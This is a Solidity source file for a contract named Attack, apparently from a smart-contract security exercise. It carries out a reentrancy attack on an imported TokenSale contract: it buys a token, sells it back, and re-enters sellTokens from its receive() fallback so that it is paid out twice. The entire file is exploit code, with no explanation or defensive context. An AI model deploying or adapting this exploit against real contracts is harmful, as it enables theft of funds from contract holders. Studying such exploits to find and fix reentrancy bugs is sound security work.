// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./TokenSale.sol";


contract Attack {
    bool avoidLoop;

    TokenSale public ts;

    constructor(address payable _addr) public payable {
        require(msg.value >= 1 ether, "You need at least 1 ether to attack!");
        ts = TokenSale(_addr);
    }

    function reentrancy() public {
        ts.buyTokens{ value: 1 ether }(1);
        ts.sellTokens(1);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        if (!avoidLoop) {
            avoidLoop = true;
            ts.sellTokens(1);
        }      
    }
}